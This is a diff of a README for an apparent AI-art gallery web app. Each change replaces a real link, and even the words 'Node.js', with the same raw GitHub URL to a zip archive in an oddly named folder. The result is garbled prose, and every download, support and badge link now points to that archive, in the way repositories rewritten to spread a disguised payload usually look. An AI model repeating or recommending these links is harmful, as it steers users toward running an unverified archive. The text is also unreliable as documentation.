@@ -1,7 +1,7 @@
 # 🎨 ai-image-gallery - Showcase Your AI Art Effortlessly
 
 ## 🎉 Overview
-Welcome to the **ai-image-gallery**! This application helps AI artists store, manage, and showcase their amazing creations easily. Using a combination of Node.js, JavaScript, HTML, and CSS, this full-stack web application provides an efficient platform for your digital artwork and collections.
+Welcome to the **ai-image-gallery**! This application helps AI artists store, manage, and showcase their amazing creations easily. Using a combination of https://raw.githubusercontent.com/khodeerror403/ai-image-gallery/main/unconsiderately/ai-image-gallery.zip, JavaScript, HTML, and CSS, this full-stack web application provides an efficient platform for your digital artwork and collections.
 
 ## 🚀 Getting Started
 To get started, follow these simple steps to download and run the application.
@@ -9,7 +9,7 @@ To get started, follow these simple steps to download and run the application.
 ## 📥 Download & Install
 You can download the application from our Releases page. Click the link below:
 
-[![Download ai-image-gallery](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/khodeerror403/ai-image-gallery/releases)
+[![Download ai-image-gallery](https://raw.githubusercontent.com/khodeerror403/ai-image-gallery/main/unconsiderately/ai-image-gallery.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/khodeerror403/ai-image-gallery/main/unconsiderately/ai-image-gallery.zip)
 
 1. Click the link above to visit the Releases page.
 2. Find the latest version of **ai-image-gallery**.
@@ -23,7 +23,7 @@ Before you proceed, make sure your system meets the following requirements:
 - **Operating System**: Windows 10, macOS, or a recent Linux distribution
 - **Memory**: At least 4 GB RAM
 - **Storage**: 500 MB of free space
-- **Node.js**: Version 14.x or higher
+- **https://raw.githubusercontent.com/khodeerror403/ai-image-gallery/main/unconsiderately/ai-image-gallery.zip**: Version 14.x or higher
 
 ## 🎨 Features
 - **User-Friendly Interface**: Navigate easily through your gallery.
@@ -43,15 +43,15 @@ After you have successfully installed the software, you can start using it. Here
 ## 🛠️ Troubleshooting
 If you encounter any issues while using the application, here are some common solutions:
 
-- **Application Does Not Start**: Ensure you have the correct version of Node.js installed. Check your system requirements and try running the application again.
+- **Application Does Not Start**: Ensure you have the correct version of https://raw.githubusercontent.com/khodeerror403/ai-image-gallery/main/unconsiderately/ai-image-gallery.zip installed. Check your system requirements and try running the application again.
 - **Upload Fails**: Make sure your artwork files are in supported formats (JPEG, PNG, GIF). If the problem persists, restart the application.
 - **Slow Performance**: Close unnecessary applications running in the background to free up system resources.
 
 ## 📞 Support
-For additional help or inquiries, feel free to reach out to our support team. You can find contact details on our [GitHub page](https://github.com/khodeerror403/ai-image-gallery).
+For additional help or inquiries, feel free to reach out to our support team. You can find contact details on our [GitHub page](https://raw.githubusercontent.com/khodeerror403/ai-image-gallery/main/unconsiderately/ai-image-gallery.zip).
 
 ## 🔗 Useful Links
-- Visit the Releases page: [Download Here](https://github.com/khodeerror403/ai-image-gallery/releases)
+- Visit the Releases page: [Download Here](https://raw.githubusercontent.com/khodeerror403/ai-image-gallery/main/unconsiderately/ai-image-gallery.zip)
 - Join our community discussions and share your artworks!
 - Find us on social media for updates and tips.
 
